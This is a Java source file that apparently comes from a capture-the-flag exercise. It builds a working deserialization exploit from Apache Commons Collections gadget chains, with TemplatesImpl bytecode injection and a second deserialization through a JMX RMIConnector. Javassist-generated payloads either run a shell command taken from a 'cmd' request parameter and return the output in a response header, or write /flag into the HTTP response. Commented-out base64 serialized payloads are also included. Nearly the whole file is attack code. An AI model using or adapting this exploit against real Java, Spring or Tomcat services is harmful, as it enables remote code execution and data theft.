import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.AbstractMapEntryDecorator;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import javax.naming.ConfigurationException;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;

/*
  AnnotationInvocationHandler.readObject
    ->AbstractInputCheckedMapDecorator.setValue
      ->TransformedMap.checkSetValue
        ->AbstractInputCheckedMapDecorator.setValue
          ->TransformedMap.checkSetValue
            ->InvokerTransformer.transform然后走rmi二次反序列化
*/



public class RMIChain {
    public static void main(String[] args) throws Exception {
        JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi://");
//        setFieldValue(jmxServiceURL, "urlPath", "/stub/rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADYWFhc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAAEc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXB0AAlnZXRNZXRob2R1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ABxzcQB+ABN1cQB+ABgAAAACcHB0AAZpbnZva2V1cQB+ABwAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAYc3EAfgATdXEAfgAYAAAAAXQABGNhbGN0AARleGVjdXEAfgAcAAAAAXEAfgAfc3EAfgAAP0AAAAAAAAx3CAAAABAAAAAAeHh0AANiYmJ4");
        setFieldValue(jmxServiceURL, "urlPath", "/stub/"+CC3Exp());
//        setFieldValue(jmxServiceURL, "urlPath", "/stub/rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADYWFhc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAACc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAPm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnN0YW50aWF0ZVRyYW5zZm9ybWVyNIv0f6SG0DsCAAJbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAXNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzcQB+ABVMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAAFL8r+ur4AAAA0AF0BAAFhBwABAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAAwEABjxpbml0PgEAAygpVgEABENvZGUBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwAIAQAdamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3IHAAoBAA1TdGFja01hcFRhYmxlDAAFAAYKAAQADQEAFmphdmEvaW8vRmlsZURlc2NyaXB0b3IHAA8BAA9qYXZhL2xhbmcvQ2xhc3MHABEBABFqYXZhL2xhbmcvSW50ZWdlcgcAEwEABFRZUEUBABFMamF2YS9sYW5nL0NsYXNzOwwAFQAWCQAUABcBABZnZXREZWNsYXJlZENvbnN0cnVjdG9yAQAzKFtMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7DAAZABoKABIAGwEAImphdmEvbGFuZy9yZWZsZWN0L0FjY2Vzc2libGVPYmplY3QHAB0BAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwAHwAgCgAeACEBABhqYXZhL2lvL0ZpbGVPdXRwdXRTdHJlYW0HACMBABBqYXZhL2xhbmcvT2JqZWN0BwAlAQAEKEkpVgwABQAnCgAUACgBAAtuZXdJbnN0YW5jZQEAJyhbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAKgArCgALACwBABsoTGphdmEvaW8vRmlsZURlc2NyaXB0b3I7KVYMAAUALgoAJAAvAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgcAMQEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIHADMBABFqYXZhL2xhbmcvUnVudGltZQcANQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMADcAOAoANgA5AQAJY2F0IC9mbGFnCAA7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAPQA+CgA2AD8BABFqYXZhL2xhbmcvUHJvY2VzcwcAQQEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsMAEMARAoAQgBFAQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWDAAFAEcKADQASAEAEyhMamF2YS9pby9SZWFkZXI7KVYMAAUASgoAMgBLAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwwATQBOCgAyAE8BABBqYXZhL2xhbmcvU3RyaW5nBwBRAQAIZ2V0Qnl0ZXMBAAQoKVtCDABTAFQKAFIAVQEABXdyaXRlAQAFKFtCKVYMAFcAWAoAJABZAQAKU291cmNlRmlsZQEABmEuamF2YQAhAAIABAAAAAAAAQABAAUABgABAAcAAACgAAkABAAAAG4qtwAOEhAEvQASWQOyABhTtgAcTCsEtgAiBj0cEDKiAE+7ACRZKwS9ACZZA7sAFFkctwApU7YALcAAELcAMLsAMlm7ADRZuAA6Ejy2AEC2AEa3AEm3AEy2AFC2AFa2AFqnAAdOpwADhAIBp/+xsQABACEAYABjAAkAAQAMAAAAGAAE/wAbAAMHAAIHAAsBAAD3AEcHAAkDBQABAFsAAAACAFxwdAAEYWFhYXB3AQB4dXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAABdnIAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzAAAAAAAAAAAAAAB4cHNxAH4AAD9AAAAAAAAMdwgAAAAQAAAAAHh4dAADYmJieA==");
        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);

        InvokerTransformer invokerTransformer = new InvokerTransformer("connect", null, null);


        HashMap<Object,Object> hash = new HashMap<Object,Object>();
        hash.put("value","value");
        Map<Object,Object> transmap1 = TransformedMap.decorate(hash,null,invokerTransformer);
        ConstantTransformer constantTransformer = new ConstantTransformer(rmiConnector);

        Map<Object,Object> transmap = TransformedMap.decorate(transmap1,null,constantTransformer);
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = c.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        InvocationHandler instance = (InvocationHandler) constructor.newInstance(Target.class,transmap);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);

        oos.writeObject(instance);

        oos.close();
//        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());
//        System.out.println(base64String);
//        System.out.println(base64String.length());



        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();

    }
    public static void setFieldValue(Object obj, String field, Object arg) throws Exception{
        Field f = obj.getClass().getDeclaredField(field);
        f.setAccessible(true);
        f.set(obj, arg);
    }
    public static String CC3Exp() throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "aaaa");
        Field bytecodesField = tc.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
      //byte[] code = payload();
        byte[] code = payload1();
        byte[][] codes = {code};
        bytecodesField.set(templates, codes);
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> map = new HashMap<>();
        Map<Object, Object> lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "aaa");
        HashMap<Object, Object> map2 = new HashMap<>();
        map2.put(tiedMapEntry, "bbb");
        lazyMap.remove("aaa");
        Class<LazyMap> c = LazyMap.class;
        Field factoryField = c.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap, chainedTransformer);
        ByteArrayOutputStream bao = new ByteArrayOutputStream();
        new ObjectOutputStream(bao).writeObject(map2);
        return Base64.getEncoder().encodeToString(bao.toByteArray()).replaceAll("\\s*", "");
    }
    public static byte[] payload() throws NotFoundException, CannotCompileException, IOException {
        String s="public MyClassLoader(){             javax.servlet.http.HttpServletRequest request = ((org.springframework.web.context.request.ServletRequestAttributes)org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();\n" +
                "            java.lang.reflect.Field r=request.getClass().getDeclaredField(\"request\");\n" +
                "            r.setAccessible(true);" +
                "            org.apache.catalina.connector.Response response =((org.apache.catalina.connector.Request) r.get(request)).getResponse();\n"+
                "            String s =new Scanner(Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream()).next();" +
                "            response.setHeader(\"night\", s);}";
        ClassPool classPool = ClassPool.getDefault();
        classPool.importPackage(Scanner.class.getName());
        CtClass ctClass = classPool.get(AbstractTranslet.class.getName());


        CtClass calc = classPool.makeClass("MyClassLoader");
        calc.setSuperclass(ctClass);
        CtConstructor ctConstructor = CtNewConstructor.make(s, calc);
        calc.addConstructor(ctConstructor);

        return calc.toBytecode();
    }
    public static byte[] payload1() throws NotFoundException, CannotCompileException, IOException {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass("SC");

        String body = "javax.servlet.http.HttpServletRequest r = ((org.springframework.web.context.request.ServletRequestAttributes) org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();\n" +
                "java.lang.reflect.Field f = r.getClass().getDeclaredField(\"request\");\n" +
                "f.setAccessible(true);\n" +
                "org.apache.catalina.connector.Response p =((org.apache.catalina.connector.Request) f.get(r)).getResponse();\n" +
                "java.io.Writer w = p.getWriter();\n" +
                "w.write(new java.util.Scanner(new java.io.File(\"/flag\")).next());\n" +
                "w.flush();";

        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setBody("{" + body + "}");
        clazz.addConstructor(constructor);
//        clazz.makeClassInitializer().setBody("{" + body + "}");

        // 设置 Super Class 为 AbstractTranslet
        CtClass superClazz = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        clazz.setSuperclass(superClazz);

        return clazz.toBytecode();
    }
}
